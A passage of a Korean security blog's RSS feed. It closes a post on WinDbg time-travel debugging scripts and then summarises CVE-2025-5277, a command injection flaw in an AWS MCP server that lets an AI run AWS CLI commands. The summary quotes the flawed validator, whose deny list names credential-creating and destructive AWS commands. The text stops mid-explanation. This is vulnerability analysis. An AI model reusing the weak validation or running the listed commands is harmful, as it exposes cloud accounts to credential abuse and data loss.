new</code>&#xC758; &#xBC18;&#xD658; &#xAC12;&#xC744; &#xD1B5;&#xD574; &#xB2E4;&#xC12F; &#xBC88;&#xC9F8; &#xC778;&#xC2A4;&#xD134;&#xC2A4;&#xC758; &#xC8FC;&#xC18C;&#xB97C; &#xD655;&#xC778;&#xD558;&#xACE0; &#xC544;&#xB798;&#xC640; &#xAC19;&#xC774; <code>Where</code>&#xB97C; &#xC0AC;&#xC6A9;&#xD574;&#xC11C; &#xD574;&#xB2F9; &#xC778;&#xC2A4;&#xD134;&#xC2A4;&#xC758; <code>process</code> &#xD638;&#xCD9C;&#xB9CC; &#xD655;&#xC778;&#xD558;&#xB294; &#xAC83;&#xC774; &#xAC00;&#xB2A5;&#xD569;&#xB2C8;&#xB2E4;. &#xD639;&#xC740; Calls&#xB97C; &#xC0AC;&#xC6A9;&#xD558;&#xACE0; <code>ReturnValue</code> &#xD544;&#xB4DC;&#xC5D0; &#xC811;&#xADFC;&#xD574;&#xC11C; &#xD574;&#xB2F9; position&#xC73C;&#xB85C; &#xC774;&#xB3D9;&#xD558;&#xC9C0; &#xC54A;&#xACE0; &#xC54C;&#xC544;&#xB0B4;&#xB294; &#xAC83;&#xB3C4; &#xAC00;&#xB2A5;&#xD569;&#xB2C8;&#xB2E4;.</p><pre><code class="hljs angelscript"><span class="hljs-number">0</span>:<span class="hljs-number">000</span>&gt; dx @$memory(<span class="hljs-number">0x7ff784d91265</span>, <span class="hljs-number">0x7ff784d91265</span>+<span class="hljs-number">1</span>, <span class="hljs-string">&quot;e&quot;</span>)[<span class="hljs-number">4</span>].TimeStart.SeekTo()(<span class="hljs-number">43f</span>8<span class="hljs-number">.567</span>c): Break instruction exception - code <span class="hljs-number">80000003</span> (first/second chance <span class="hljs-keyword">not</span> available)Time Travel Position: <span class="hljs-number">4</span>D8:<span class="hljs-number">24</span>A2<span class="hljs-number">0</span>:<span class="hljs-number">000</span>&gt; pTime Travel Position: <span class="hljs-number">4</span>D8:<span class="hljs-number">25</span>EATTDCalls!main+<span class="hljs-number">0xba</span>:<span class="hljs-number">00007f</span>f7`<span class="hljs-number">84</span>d9126a <span class="hljs-number">488930</span>          mov     qword ptr [rax],rsi ds:<span class="hljs-number">000001e0</span>`<span class="hljs-number">00059750</span>=<span class="hljs-number">6562575</span>c32336d65<span class="hljs-number">0</span>:<span class="hljs-number">000</span>&gt; r raxrax=<span class="hljs-number">000001e000059750</span><span class="hljs-number">0</span>:<span class="hljs-number">000</span>&gt; dx @$calls(<span class="hljs-string">&quot;TTDCalls!operator new&quot;</span>).Where(x =&gt; x.ReturnAddress == <span class="hljs-number">0x7ff784d9126a</span>)[<span class="hljs-number">0x8</span>].ReturnValue@$calls(<span class="hljs-string">&quot;TTDCalls!operator new&quot;</span>).Where(x =&gt; x.ReturnAddress == <span class="hljs-number">0x7ff784d9126a</span>)[<span class="hljs-number">0x8</span>].ReturnValue                 : <span class="hljs-number">0x1e000059750</span> [Type: <span class="hljs-built_in">void</span> *]</code></pre><p> &#xD2B9;&#xC815; &#xC778;&#xC2A4;&#xD134;&#xC2A4;&#xC5D0; &#xC758;&#xD55C; &#xD638;&#xCD9C;&#xB9CC; &#xBCF4;&#xB824;&#xBA74; &#xCCAB; &#xBC88;&#xC9F8; &#xC778;&#xC790;(<code>this</code>)&#xAC00; &#xC778;&#xC2A4;&#xD134;&#xC2A4;&#xC758; &#xC8FC;&#xC18C;&#xC778; &#xAC83;&#xC744; &#xC774;&#xC6A9;&#xD558;&#xBA74; &#xB418;&#xACA0;&#xC8E0;? &#xC774; &#xC608;&#xC81C;&#xC758; &#xACBD;&#xC6B0;&#xC5D0;&#xB294; pdb&#xB294; &#xBB3C;&#xB860; &#xC18C;&#xC2A4;&#xCF54;&#xB4DC;&#xAE4C;&#xC9C0; &#xC788;&#xC5B4;&#xC11C; <code>Parameters</code>&#xC5D0;&#xC11C; &#xC778;&#xB371;&#xC2A4; &#xB300;&#xC2E0; &#xD30C;&#xB77C;&#xBBF8;&#xD130;&#xC758; &#xC774;&#xB984;&#xC73C;&#xB85C; &#xBC14;&#xB85C; &#xC811;&#xADFC;&#xD560; &#xC218;&#xB3C4; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;.</p><pre><code class="hljs angelscript"><span class="hljs-number">0</span>:<span class="hljs-number">000</span>&gt; dx @$calls(<span class="hljs-string">&quot;TTDCalls!ConcreteProcessor::process&quot;</span>).Where(x =&gt; x.Parameters[<span class="hljs-number">0</span>] == <span class="hljs-number">0x1e000059750</span>)@$calls(<span class="hljs-string">&quot;TTDCalls!ConcreteProcessor::process&quot;</span>).Where(x =&gt; x.Parameters[<span class="hljs-number">0</span>] == <span class="hljs-number">0x1e000059750</span>)                    [<span class="hljs-number">0x6</span>]               [<span class="hljs-number">0xf</span>]               [<span class="hljs-number">0x21</span>]              [<span class="hljs-number">0x2a</span>]              [<span class="hljs-number">0x2c</span>]              [<span class="hljs-number">0x2f</span>]              [<span class="hljs-number">0x32</span>]              [<span class="hljs-number">0x39</span>]              [<span class="hljs-number">0x3f</span>]              [<span class="hljs-number">0x43</span>]              [<span class="hljs-number">0x57</span>]              [<span class="hljs-number">0x5e</span>]</code></pre><p>&#xC0AC;&#xC6A9;&#xB41C; &#xC778;&#xC790;&#xB9CC; &#xD655;&#xC778;&#xD574;&#xBCF4;&#xB824;&#xBA74; &#xC544;&#xB798;&#xC640; &#xAC19;&#xC774; Select&#xB97C; &#xC0AC;&#xC6A9;&#xD574;&#xC11C; Parameters &#xD544;&#xB4DC;&#xB9CC; &#xB0A8;&#xAE30;&#xACE0; <code>-g</code> &#xC635;&#xC158;&#xC73C;&#xB85C; &#xADF8;&#xB9AC;&#xB4DC; &#xBDF0;&#xB85C; &#xCD9C;&#xB825;&#xD558;&#xBA74; &#xB429;&#xB2C8;&#xB2E4;.</p><pre><code class="hljs jsx"><span class="hljs-number">0</span>:<span class="hljs-number">000</span>&gt; dx -g @$calls(<span class="hljs-string">&quot;TTDCalls!ConcreteProcessor::process&quot;</span>).Where(<span class="hljs-function"><span class="hljs-params">x</span> =&gt;</span> x.Parameters.this == <span class="hljs-number">0x1e000059750</span>).Select(<span class="hljs-function"><span class="hljs-params">x</span> =&gt;</span> x.Parameters)======================================================================           = value  = (+) <span class="hljs-built_in">this</span>         = (+) [<span class="hljs-number">0x0</span>]        = [<span class="hljs-number">0x1</span>]  ======================================================================= [<span class="hljs-number">0x6</span>]     - <span class="hljs-number">397</span>    - <span class="hljs-number">0x1e000059750</span>    - <span class="hljs-number">0x1e000059750</span>    - <span class="hljs-number">397</span>    == [<span class="hljs-number">0xf</span>]     - <span class="hljs-number">187</span>    - <span class="hljs-number">0x1e000059750</span>    - <span class="hljs-number">0x1e000059750</span>    - <span class="hljs-number">187</span>    == [<span class="hljs-number">0x21</span>]    - <span class="hljs-number">290</span>    - <span class="hljs-number">0x1e000059750</span>    - <span class="hljs-number">0x1e000059750</span>    - <span class="hljs-number">290</span>    == [<span class="hljs-number">0x2a</span>]    - <span class="hljs-number">983</span>    - <span class="hljs-number">0x1e000059750</span>    - <span class="hljs-number">0x1e000059750</span>    - <span class="hljs-number">983</span>    == [<span class="hljs-number">0x2c</span>]    - <span class="hljs-number">209</span>    - <span class="hljs-number">0x1e000059750</span>    - <span class="hljs-number">0x1e000059750</span>    - <span class="hljs-number">209</span>    == [<span class="hljs-number">0x2f</span>]    - <span class="hljs-number">447</span>    - <span class="hljs-number">0x1e000059750</span>    - <span class="hljs-number">0x1e000059750</span>    - <span class="hljs-number">447</span>    == [<span class="hljs-number">0x32</span>]    - <span class="hljs-number">123</span>    - <span class="hljs-number">0x1e000059750</span>    - <span class="hljs-number">0x1e000059750</span>    - <span class="hljs-number">123</span>    == [<span class="hljs-number">0x39</span>]    - <span class="hljs-number">229</span>    - <span class="hljs-number">0x1e000059750</span>    - <span class="hljs-number">0x1e000059750</span>    - <span class="hljs-number">229</span>    == [<span class="hljs-number">0x3f</span>]    - <span class="hljs-number">248</span>    - <span class="hljs-number">0x1e000059750</span>    - <span class="hljs-number">0x1e000059750</span>    - <span class="hljs-number">248</span>    == [<span class="hljs-number">0x43</span>]    - <span class="hljs-number">18</span>     - <span class="hljs-number">0x1e000059750</span>    - <span class="hljs-number">0x1e000059750</span>    - <span class="hljs-number">18</span>     == [<span class="hljs-number">0x57</span>]    - <span class="hljs-number">754</span>    - <span class="hljs-number">0x1e000059750</span>    - <span class="hljs-number">0x1e000059750</span>    - <span class="hljs-number">754</span>    == [<span class="hljs-number">0x5e</span>]    - <span class="hljs-number">319</span>    - <span class="hljs-number">0x1e000059750</span>    - <span class="hljs-number">0x1e000059750</span>    - <span class="hljs-number">319</span>    ======================================================================</code></pre><p>&#xB2F9;&#xC5F0;&#xD788; <code>Where</code>&#xC5D0; &#xB2E4;&#xB978; &#xC870;&#xAC74;&#xB4E4;&#xC744; &#xB354; &#xC0AC;&#xC6A9;&#xD560; &#xC218;&#xB3C4; &#xC788;&#xACE0; &#xC544;&#xB798;&#xC640; &#xAC19;&#xC774; TTD position&#xC744; &#xBE44;&#xAD50;&#xD558;&#xB294; &#xAE30;&#xB2A5;&#xC744; extension&#xC73C;&#xB85C; &#xAD6C;&#xD604;&#xD574;&#xB450;&#xACE0; <code>Where</code> &#xC548;&#xC5D0;&#xC11C; &#xC870;&#xAC74;&#xC73C;&#xB85C; &#xCD94;&#xAC00;&#xD558;&#xB294; &#xAC83;&#xB3C4; &#xAC00;&#xB2A5;&#xD569;&#xB2C8;&#xB2E4;.</p><pre><code class="hljs jsx"><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">ttdParsePosition</span>(<span class="hljs-params">pos</span>)</span>{<span class="hljs-keyword">var</span> sequence = <span class="hljs-number">0</span><span class="hljs-keyword">var</span> steps = <span class="hljs-number">0</span><span class="hljs-keyword">if</span>(<span class="hljs-keyword">typeof</span>(pos) == <span class="hljs-string">&quot;string&quot;</span>){sequence = <span class="hljs-built_in">parseInt</span>(pos.split(<span class="hljs-string">&quot;:&quot;</span>)[<span class="hljs-number">0</span>], <span class="hljs-number">16</span>)steps = <span class="hljs-built_in">parseInt</span>(pos.split(<span class="hljs-string">&quot;:&quot;</span>)[<span class="hljs-number">1</span>], <span class="hljs-number">16</span>)}<span class="hljs-keyword">else</span>{sequence = pos.Sequencesteps = pos.Steps}<span class="hljs-keyword">return</span> {Sequence: sequence,Steps: steps}}<span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__ttd_position_compare</span>(<span class="hljs-params">pos1, pos2</span>)</span>{<span class="hljs-comment">/*</span><span class="hljs-comment">alias: poscmp</span><span class="hljs-comment">parameters:</span><span class="hljs-comment">pos1 &amp; pos2: Position object or string(Sequence:Steps in hexadicimal)</span><span class="hljs-comment">usage:</span><span class="hljs-comment">&gt; !poscmp(pos1, pos2)</span><span class="hljs-comment">&gt; dx @$poscmp(pos1, pos2)</span><span class="hljs-comment">example:</span><span class="hljs-comment">&gt; dx @$calls(&quot;function&quot;).Where(x =&gt; @$poscmp(&quot;17C83A:1777&quot;, x.TimeStart) &lt; 0).Where(x =&gt; @$poscmp(&quot;17C861:1B3A&quot;, x.TimeEnd) &gt; 0)</span><span class="hljs-comment">=&gt; get all `function` calls between 17C83A:1777 and 17C861:1B3A</span><span class="hljs-comment">*/</span>pos1 = ttdParsePosition(pos1)pos2 = ttdParsePosition(pos2)<span class="hljs-keyword">if</span>(pos1.Sequence != pos2.Sequence){<span class="hljs-keyword">return</span> pos1.Sequence - pos2.Sequence}<span class="hljs-keyword">return</span> pos1.Steps - pos2.Steps}</code></pre><p>&#xC774;&#xAC78; &#xBAA8;&#xB450; &#xC885;&#xD569;&#xD574;&#xBCF4;&#xBA74;? &#xC544;&#xB798;&#xC640; &#xAC19;&#xC740; &#xAD34;&#xBB3C;&#xC774; &#xD0C4;&#xC0DD;&#xD569;&#xB2C8;&#xB2E4;&#x2026;</p><pre><code class="hljs angelscript"><span class="hljs-number">0</span>:<span class="hljs-number">000</span>&gt; dx -r1 @$calls(<span class="hljs-string">&quot;TTDCalls!ConcreteProcessor::process&quot;</span>).Where(x =&gt; x.Parameters.<span class="hljs-keyword">this</span> == <span class="hljs-number">0x1e000059750</span>)[<span class="hljs-number">6</span>]@$calls(<span class="hljs-string">&quot;TTDCalls!ConcreteProcessor::process&quot;</span>).Where(x =&gt; x.Parameters.<span class="hljs-keyword">this</span> == <span class="hljs-number">0x1e000059750</span>)[<span class="hljs-number">6</span>]                    EventType        : <span class="hljs-number">0x0</span>    ThreadId         : <span class="hljs-number">0x567c</span>    UniqueThreadId   : <span class="hljs-number">0x2</span>    TimeStart        : <span class="hljs-number">4</span>DA:<span class="hljs-number">10</span>F0 [Time Travel]    TimeEnd          : <span class="hljs-number">4</span>DA:<span class="hljs-number">10</span>F3 [Time Travel]    Function         : TTDCalls!ConcreteProcessor::process    FunctionAddress  : <span class="hljs-number">0x7ff784d911a0</span>    ReturnAddress    : <span class="hljs-number">0x7ff784d9134e</span>    Parameters          SystemTimeStart  : <span class="hljs-number">2025</span>&#xB144; <span class="hljs-number">5</span>&#xC6D4; <span class="hljs-number">31</span>&#xC77C; &#xD1A0;&#xC694;&#xC77C; <span class="hljs-number">12</span>:<span class="hljs-number">24</span>:<span class="hljs-number">28.633</span>    SystemTimeEnd    : <span class="hljs-number">2025</span>&#xB144; <span class="hljs-number">5</span>&#xC6D4; <span class="hljs-number">31</span>&#xC77C; &#xD1A0;&#xC694;&#xC77C; <span class="hljs-number">12</span>:<span class="hljs-number">24</span>:<span class="hljs-number">28.633</span><span class="hljs-number">0</span>:<span class="hljs-number">000</span>&gt; dx -r1 @$calls(<span class="hljs-string">&quot;TTDCalls!ConcreteProcessor::process&quot;</span>).Where(x =&gt; x.Parameters.<span class="hljs-keyword">this</span> == <span class="hljs-number">0x1e000059750</span>)[<span class="hljs-number">94</span>]@$calls(<span class="hljs-string">&quot;TTDCalls!ConcreteProcessor::process&quot;</span>).Where(x =&gt; x.Parameters.<span class="hljs-keyword">this</span> == <span class="hljs-number">0x1e000059750</span>)[<span class="hljs-number">94</span>]                    EventType        : <span class="hljs-number">0x0</span>    ThreadId         : <span class="hljs-number">0x567c</span>    UniqueThreadId   : <span class="hljs-number">0x2</span>    TimeStart        : <span class="hljs-number">4</span>DB:<span class="hljs-number">820</span> [Time Travel]    TimeEnd          : <span class="hljs-number">4</span>DB:<span class="hljs-number">823</span> [Time Travel]    Function         : TTDCalls!ConcreteProcessor::process    FunctionAddress  : <span class="hljs-number">0x7ff784d911a0</span>    ReturnAddress    : <span class="hljs-number">0x7ff784d9134e</span>    Parameters          SystemTimeStart  : <span class="hljs-number">2025</span>&#xB144; <span class="hljs-number">5</span>&#xC6D4; <span class="hljs-number">31</span>&#xC77C; &#xD1A0;&#xC694;&#xC77C; <span class="hljs-number">12</span>:<span class="hljs-number">24</span>:<span class="hljs-number">28.633</span>    SystemTimeEnd    : <span class="hljs-number">2025</span>&#xB144; <span class="hljs-number">5</span>&#xC6D4; <span class="hljs-number">31</span>&#xC77C; &#xD1A0;&#xC694;&#xC77C; <span class="hljs-number">12</span>:<span class="hljs-number">24</span>:<span class="hljs-number">28.633</span><span class="hljs-number">0</span>:<span class="hljs-number">000</span>&gt; dx @$calls(<span class="hljs-string">&quot;TTDCalls!ConcreteProcessor::process&quot;</span>).Where(x =&gt; x.Parameters.<span class="hljs-keyword">this</span> != <span class="hljs-number">0x1e000059750</span> &amp;&amp; @$poscmp(x.TimeStart, <span class="hljs-string">&quot;4DA:10F0&quot;</span>) &gt; <span class="hljs-number">0</span> &amp;&amp; @$poscmp(<span class="hljs-string">&quot;4DB:823&quot;</span>, x.TimeEnd) &lt; <span class="hljs-number">0</span>)@$calls(<span class="hljs-string">&quot;TTDCalls!ConcreteProcessor::process&quot;</span>).Where(x =&gt; x.Parameters.<span class="hljs-keyword">this</span> != <span class="hljs-number">0x1e000059750</span> &amp;&amp; @$poscmp(x.TimeStart, <span class="hljs-string">&quot;4DA:10F0&quot;</span>) &gt; <span class="hljs-number">0</span> &amp;&amp; @$poscmp(<span class="hljs-string">&quot;4DB:823&quot;</span>, x.TimeEnd) &lt; <span class="hljs-number">0</span>)                    [<span class="hljs-number">0x5f</span>]              [<span class="hljs-number">0x60</span>]              [<span class="hljs-number">0x61</span>]              [<span class="hljs-number">0x62</span>]              [<span class="hljs-number">0x63</span>]          </code></pre><p>&#xC704; &#xCEE4;&#xB9E8;&#xB4DC;&#xB294; &#xB2E4;&#xC12F; &#xBC88;&#xC9F8; <code>ConcreteProcessor</code> &#xC778;&#xC2A4;&#xD134;&#xC2A4;&#xC758; &#xCCAB; &#xBC88;&#xC9F8;&#xC640; &#xB9C8;&#xC9C0;&#xB9C9; <code>process</code>&#xD638;&#xCD9C;&#xC758; position&#xC744; &#xD655;&#xC778;&#xD558;&#xACE0; &#xC774; &#xC0AC;&#xC774;&#xC5D0; &#xD638;&#xCD9C;&#xB41C; &#xB2E4;&#xB978; &#xC778;&#xC2A4;&#xD134;&#xC2A4;&#xC758; <code>process</code>&#xD638;&#xCD9C;&#xB9CC; &#xB9AC;&#xC2A4;&#xD305;&#xD569;&#xB2C8;&#xB2E4;.</p><h1 id="&#xB9C8;&#xCE58;&#xBA70;"><a href="#&#xB9C8;&#xCE58;&#xBA70;" class="headerlink" title="&#xB9C8;&#xCE58;&#xBA70;"></a>&#xB9C8;&#xCE58;&#xBA70;</h1><p>&#xB2E4; &#xC4F0;&#xACE0; &#xB098;&#xB2C8; &#xBB54;&#xAC00; &#xC2A4;&#xD06C;&#xB9BD;&#xD305;&#xBCF4;&#xB2E4;&#xB3C4; windbg&#xC758; TTD &#xB370;&#xC774;&#xD130; &#xC624;&#xBE0C;&#xC81D;&#xD2B8;(Calls, Memory)&#xC5D0; &#xB300;&#xD55C; &#xB0B4;&#xC6A9;&#xC774; &#xB354; &#xB9CE;&#xC740;&#xAC83; &#xAC19;&#xB124;&#xC694; &#x1F605; <a href="https://learn.microsoft.com/ko-kr/windows-hardware/drivers/debugger/javascript-debugger-scripting">MS &#xBB38;&#xC11C;</a>&#xC5D0;&#xC11C; &#xC124;&#xBA85;&#xD558;&#xB294; &#xB0B4;&#xC6A9; &#xC704;&#xC8FC;&#xB85C; &#xC2A4;&#xD06C;&#xB9BD;&#xD2B8;&#xB97C; &#xC5B4;&#xB5BB;&#xAC8C; &#xC791;&#xC131;&#xD574;&#xC11C; &#xC368;&#xC57C;&#xD558;&#xB294;&#xC9C0;&#xB97C; &#xB2E4;&#xB8E8;&#xB294; &#xAC83;&#xB3C4; &#xB098;&#xC058;&#xC9C4; &#xC54A;&#xC558;&#xACA0;&#xC9C0;&#xB9CC; &#xC800;&#xAC78; &#xC77D;&#xB294;&#xAC8C; &#xBCC4;&#xB85C; &#xB0B4;&#xD0A4;&#xC9C0; &#xC54A;&#xB354;&#xAD70;&#xC694;;; &#xC800;&#xB3C4; 0vercl0k&#xB2D8;&#xC758; <a href="https://github.com/0vercl0k/windbg-scripts">&#xC608;&#xC81C;&#xB4E4;</a>&#xB85C; &#xC801;&#xB2F9;&#xD788; &#xACF5;&#xBD80;&#xD558;&#xACE0; &#xC544;&#xC8FC; &#xAC04;&#xB2E8;&#xD55C; &#xC2A4;&#xD06C;&#xB9BD;&#xD2B8;&#xB9CC; &#xC0AC;&#xC6A9;&#xD588;&#xB294;&#xB370;&#xB3C4; &#xC2A4;&#xD06C;&#xB9BD;&#xD2B8;&#xB97C; &#xC37C;&#xC744;&#xB54C;&#xC640; &#xC548; &#xC37C;&#xC744;&#xB54C;&#xC758; &#xCC28;&#xC774;&#xB294; &#xBD84;&#xBA85;&#xD588;&#xC2B5;&#xB2C8;&#xB2E4;. &#xD2B9;&#xD788; TTD&#xB9CC;&#xC73C;&#xB85C;&#xB3C4; &#xC774;&#xBBF8; &#xD601;&#xC2E0;&#xC774;&#xB77C;&#xACE0; &#xC0DD;&#xAC01;&#xD588;&#xB294;&#xB370; &#xAE30;&#xB2A5;&#xC744; &#xD558;&#xB098;&#xC529; &#xC54C;&#xAC8C; &#xB420;&#xB54C;&#xB9C8;&#xB2E4; &#xC774;&#xAC70; &#xC548;&#xC4F0;&#xACE0; &#xC5B4;&#xB5BB;&#xAC8C; &#xC0B4;&#xC558;&#xB098; &#xC2F6;&#xC5C8;&#xC5B4;&#xC694;;;</p><p><img src="/2025/06/01/pwndorei/windbg_js/image%206.png" alt="image.png"></p><p>&#xC544;&#xBB34;&#xD2BC; &#xC774;&#xBC88; &#xAE00;&#xB3C4; &#xC77D;&#xC5B4;&#xC8FC;&#xC154;&#xC11C; &#xAC10;&#xC0AC;&#xD558;&#xACE0; &#xC774; &#xAE30;&#xD68C;&#xC5D0; &#xC800;&#xD76C; &#xD300;&#xC6D0;&#xB4E4;&#xB3C4; &#xAF2D; &#xC880; &#xC368;&#xBD24;&#xC73C;&#xBA74; &#xC88B;&#xACA0;&#xB124;&#xC694;.</p>]]></content:encoded>
      
      
      <category domain="https://hackyboiz.github.io/categories/Research/">Research</category>
      
      
      <category domain="https://hackyboiz.github.io/tags/windbg/">windbg</category>
      
      <category domain="https://hackyboiz.github.io/tags/pwndorei/">pwndorei</category>
      
      <category domain="https://hackyboiz.github.io/tags/TTD/">TTD</category>
      
      <category domain="https://hackyboiz.github.io/tags/Debugging/">Debugging</category>
      
      
      <comments>https://hackyboiz.github.io/2025/06/01/pwndorei/windbg_js/#disqus_thread</comments>
      
    </item>
    
    <item>
      <title>[하루한줄] CVE-2025-5277: AWS MCP Server의 검증 부족으로 인한 Command Injection 취약점</title>
      <link>https://hackyboiz.github.io/2025/05/31/l0ch/2025-05-31/</link>
      <guid>https://hackyboiz.github.io/2025/05/31/l0ch/2025-05-31/</guid>
      <pubDate>Sat, 31 May 2025 08:00:00 GMT</pubDate>
      
        
        
      <description>&lt;h2 id=&quot;URL&quot;&gt;&lt;a href=&quot;#URL&quot; class=&quot;headerlink&quot; title=&quot;URL&quot;&gt;&lt;/a&gt;URL&lt;/h2&gt;&lt;p&gt;&lt;a href=&quot;https://github.com/advisories/GHSA-m4qw-j7mx-qv6h&quot;&gt;https:</description>
        
      
      
      
      <content:encoded><![CDATA[<h2 id="URL"><a href="#URL" class="headerlink" title="URL"></a>URL</h2><p><a href="https://github.com/advisories/GHSA-m4qw-j7mx-qv6h">https://github.com/advisories/GHSA-m4qw-j7mx-qv6h</a></p><h2 id="Target"><a href="#Target" class="headerlink" title="Target"></a>Target</h2><ul><li>AWS MCP server</li></ul><h2 id="Explain"><a href="#Explain" class="headerlink" title="Explain"></a>Explain</h2><p>AI&#xAC00; AWS CLI &#xBA85;&#xB839;&#xC5B4;&#xB97C; &#xC2E4;&#xD589;&#xD560; &#xC218; &#xC788;&#xB3C4;&#xB85D; &#xC9C0;&#xC6D0;&#xD558;&#xB294; AWS MCP &#xC11C;&#xBC84; &#xD504;&#xB85C;&#xC81D;&#xD2B8;&#xC5D0;&#xC11C; &#xBC1C;&#xACAC;&#xB41C; Command Injection &#xCDE8;&#xC57D;&#xC810;&#xC758; &#xC138;&#xBD80; &#xC815;&#xBCF4;&#xAC00; &#xACF5;&#xAC1C;&#xB418;&#xC5C8;&#xC2B5;&#xB2C8;&#xB2E4;.</p><p>&#xCDE8;&#xC57D;&#xC810;&#xC740; &#xD074;&#xB77C;&#xC774;&#xC5B8;&#xD2B8;&#xC758; &#xD504;&#xB86C;&#xD504;&#xD2B8;&#xB97C; &#xD1B5;&#xD574; &#xC804;&#xB2EC; &#xD639;&#xC740; &#xC0DD;&#xC131;&#xB418;&#xB294; &#xBA85;&#xB839;&#xC5B4;&#xAC00; <code>execute_aws_command()</code>, <code>execute_pipe_command()</code> &#xB4F1;&#xC758; &#xD568;&#xC218;&#xB97C; &#xD1B5;&#xD574; &#xC2E4;&#xD589;&#xB418;&#xAE30; &#xC804; &#xAC80;&#xC99D;&#xC744; &#xC218;&#xD589;&#xD558;&#xB294; <code>validate_aws_command()</code> &#xD568;&#xC218;&#xC5D0; &#xC874;&#xC7AC;&#xD569;&#xB2C8;&#xB2E4;.</p><pre><code class="hljs python"><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">validate_aws_command</span>(<span class="hljs-params">command: str</span>) -&gt; <span class="hljs-keyword">None</span>:</span>    <span class="hljs-string">&quot;&quot;&quot;Validate that the command is a proper AWS CLI command.</span><span class="hljs-string"></span><span class="hljs-string">    Args:</span><span class="hljs-string">        command: The AWS CLI command to validate</span><span class="hljs-string"></span><span class="hljs-string">    Raises:</span><span class="hljs-string">        CommandValidationError: If the command is invalid</span><span class="hljs-string">    &quot;&quot;&quot;</span>    cmd_parts = shlex.split(command)    <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> cmd_parts <span class="hljs-keyword">or</span> cmd_parts[<span class="hljs-number">0</span>].lower() != <span class="hljs-string">&quot;aws&quot;</span>:        <span class="hljs-keyword">raise</span> CommandValidationError(<span class="hljs-string">&quot;Commands must start with &apos;aws&apos;&quot;</span>)    <span class="hljs-keyword">if</span> len(cmd_parts) &lt; <span class="hljs-number">2</span>:        <span class="hljs-keyword">raise</span> CommandValidationError(<span class="hljs-string">&quot;Command must include an AWS service (e.g., aws s3)&quot;</span>)    <span class="hljs-comment"># Optional: Add a deny list for potentially dangerous commands</span>    dangerous_commands = [<span class="hljs-string">&quot;aws iam create-user&quot;</span>, <span class="hljs-string">&quot;aws iam create-access-key&quot;</span>, <span class="hljs-string">&quot;aws ec2 terminate-instances&quot;</span>, <span class="hljs-string">&quot;aws rds delete-db-instance&quot;</span>]    <span class="hljs-keyword">if</span> any(command.startswith(dangerous_cmd) <span class="hljs-keyword">for</span> dangerous_cmd <span class="hljs-keyword">in</span> dangerous_commands):        <span class="hljs-keyword">raise</span> CommandValidationError(<span class="hljs-string">&quot;This command is restricted for security reasons&quot;</span>)</code></pre><p>&#xD574;&#xB2F9; &#xD568;&#xC218;&#xB294; &#xB2E4;&#xC74C;  &#xAC80;&#xC99D;&#xC744; &#xC218;&#xD589;&#xD569;&#xB2C8;&#xB2E4;.</p><ol><li><code>cmd_parts[0].lower() != &quot;aws&quot;</code> : aws&#xB85C; &#xC2DC;&#xC791;&#xD558;&#xB294;&#xC9C0; &#xD655;&#xC778;</li><li><code>len(cmd_parts) &lt; 2</code> : &#xB450; &#xBC88;&#xC9F8; &#xC778;&#xC790;&#xAC00; &#xC788;&#xB294;&#xC9C0; &#xD655;&#xC778;</li><li><code>command.startswith(dangerous_cmd)</code>: &#xD2B9;&#xC815; &#xC704;&#xD5D8;&#xD55C; &#xBA85;&#xB839;&#xC5B4;&#xC5D0; &#xB300;&#xD55C; deny list &#xAC80;&#xC99D; </li></ol><p>&#xADF8;&#xB7EC;&#xB098; &#xD574;&#xB2F9; &#xD568;&#xC218;&#xC5D0;&#xB294; Command Injection&#xC5D0; &#xC545;&#xC6A9;&#xB420; &#xC218; &#xC788;&#xB294; &#xC258; &#xBA54;&#xD0C0;&#xBB38;&#xC790;&#xB098;, root, admin&#xACFC; &#xAD00;&#xB828;&#xB41C; &#xBBFC;&#xAC10;&#xD55C; &#xBA85;&#xB839;&#xC5B4;&#xAC00; &#xD3EC;&#xD568;&#xB418;&#xC5B4; &#xC788;&#xB294;&#xC9C0; &#xAC80;&#xC0AC;&#xD558;&#xC9C0; &#xC54A;&#xC2B5;&#xB2C8;&#xB2E4;.</p><pre><code class="hljs python"><span class="hljs-keyword">async</span> <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">execute_aws_command</span>(<span class="hljs-params">command: str, timeout: int | None = None</span>) -&gt; CommandResult:</span>    <span class="hljs-string">&quot;&quot;&quot;Execute an AWS CLI command and return the result.</span><span class="hljs-string">    ...</span><span class="hljs-string">    &quot;&quot;&quot;</span>    <span class="hljs-comment"># ...</span>    <span class="hljs-comment"># Validate the command</span>    validate_aws_command(command)    <span class="hljs-comment"># ...</span>    <span class="hljs-keyword">try</span>:        <span class="hljs-comment"># Split command safely for exec</span>        cmd_parts = shlex.split(command)        <span class="hljs-comment"># Create subprocess using exec (safer than shell=True)</span>        process = <span class="hljs-keyword">await</span> asyncio.create_subprocess_exec(*cmd_parts, stdout=asyncio.subprocess.PIPE, stderr=asyncio.subprocess.PIPE)        <span class="hljs-comment"># ...</span></code></pre><p><code>validate_aws_command</code>&#xB97C; &#xD1B5;&#xD574; &#xBA85;&#xB839;&#xC5B4;&#xB97C; &#xAC80;&#xC99D;&#xD55C; &#xC774;&#xD6C4;&#xC5D0;&#xB294; <code>shlex.split</code>&#xC744; &#xD1B5;&#xD574; &#xACF5;&#xBC31;&#xC744; &#xAE30;&#xC900;&#xC73C;&#xB85C; &#xBA85;&#xB839;&#xC5B4;&#xB97C; &#xBD84;&#xB9AC;&#xD55C; &#xD6C4; <code>create_subprocess_exec</code>&#xB85C; &#xBA85;&#xB839;&#xC5B4;&#xB97C; &#xC2E4;&#xD589;&#xD558;&#xB294;&#xB370;,  <code>shell=True</code>&#xB97C; &#xC0AC;&#xC6A9;&#xD558;&#xC9C0; &#xC54A;&#xACE0; <code>*cmd_parts</code> &#xB97C; &#xC9C1;&#xC811; &#xC804;&#xB2EC;&#xD558;&#xB294; &#xBC29;&#xC2DD;&#xC73C;&#xB85C; &#xC778;&#xD574; &#xC258; &#xBA54;&#xD0C0; &#xBB38;&#xC790;&#xAC00; &#xD3EC;&#xD568;&#xB41C; &#xBA85;&#xB839;&#xC5B4;&#xB97C; &#xC258;&#xC774; &#xD574;&#xC11D;&#xD558;&#xB294; &#xACFC;&#xC815;&#xC5D0;&#xC11C; &#xC784;&#xC758;&#xC758; &#xBA85;&#xB839;&#xC5B4; 